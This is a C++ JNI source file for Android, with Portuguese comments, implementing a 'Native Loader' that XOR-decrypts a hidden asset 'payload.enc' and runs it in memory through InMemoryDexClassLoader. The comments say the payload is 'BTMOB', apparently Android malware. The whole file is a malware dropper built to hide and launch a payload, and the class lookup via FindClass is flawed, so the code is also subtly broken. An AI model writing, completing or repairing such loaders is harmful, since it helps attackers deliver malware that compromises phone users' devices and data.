#include <jni.h>
#include <android/log.h>
#include <android/asset_manager.h>
#include <android/asset_manager_jni.h>
#include <vector>
#include <string>

#define LOG_TAG "NativeLoader"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)

extern "C" JNIEXPORT void JNICALL
Java_com_phantom_loader_MainActivity_loadAndRunPayload(JNIEnv* env, jobject /* this */, jobject context) {
    LOGD("Iniciando Native Loader...");

    // 1. Pega o AssetManager para ler o payload.enc
    jclass contextClass = env->GetObjectClass(context);
    jmethodID getAssetsMethod = env->GetMethodID(contextClass, "getAssets", "()Landroid/content/res/AssetManager;");
    jobject assetManager = env->CallObjectMethod(context, getAssetsMethod);
    AAssetManager* mgr = AAssetManager_fromJava(env, assetManager);

    AAsset* asset = AAssetManager_open(mgr, "payload.enc", AASSET_MODE_BUFFER);
    if (asset == nullptr) {
        LOGD("Erro: payload.enc nao encontrado.");
        return;
    }

    // 2. Lê os bytes criptografados
    off_t length = AAsset_getLength(asset);
    std::vector<char> buffer(length);
    AAsset_read(asset, buffer.data(), length);
    AAsset_close(asset);

    // 3. Descriptografa (XOR com 0x42)
    for (int i = 0; i < length; i++) {
        buffer[i] ^= 0x42;
    }

    // 4. Cria o ByteBuffer com os bytes descriptografados
    jclass byteBufferClass = env->FindClass("java/nio/ByteBuffer");
    jmethodID wrapMethod = env->GetStaticMethodID(byteBufferClass, "wrap", "([B)Ljava/nio/ByteBuffer;");
    jbyteArray byteArray = env->NewByteArray(length);
    env->SetByteArrayRegion(byteArray, 0, length, (jbyte*)buffer.data());
    jobject byteBuffer = env->CallStaticObjectMethod(byteBufferClass, wrapMethod, byteArray);

    // 5. Instancia o InMemoryDexClassLoader (Android 8+)
    jclass classLoaderClass = env->FindClass("java/lang/ClassLoader");
    jmethodID getSystemClassLoader = env->GetStaticMethodID(classLoaderClass, "getSystemClassLoader", "()Ljava/lang/ClassLoader;");
    jobject parentClassLoader = env->CallStaticObjectMethod(classLoaderClass, getSystemClassLoader);

    jclass inMemoryClass = env->FindClass("dalvik/system/InMemoryDexClassLoader");
    jmethodID constructor = env->GetMethodID(inMemoryClass, "<init>", "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V");
    jobject dexClassLoader = env->NewObject(inMemoryClass, constructor, byteBuffer, parentClassLoader);

    // 6. Carrega a classe principal do BTMOB (você precisa saber o nome dela!)
    // Exemplo: "com.btmob.MainActivity"
    jclass payloadClass = env->FindClass("com/btmob/MainActivity"); // MUDE AQUI SE SOUBER O NOME REAL
    if (payloadClass == nullptr) {
        LOGD("Classe do payload nao encontrada. Usando fallback para executar via reflexao.");
        return;
    }

    // 7. Chama o metodo 'run' ou 'main' do payload (depende de como o BTMOB foi feito)
    jmethodID runMethod = env->GetStaticMethodID(payloadClass, "run", "(Landroid/content/Context;)V");
    if (runMethod != nullptr) {
        env->CallStaticVoidMethod(payloadClass, runMethod, context);
    }

    LOGD("Payload executado com sucesso da memoria!");
}
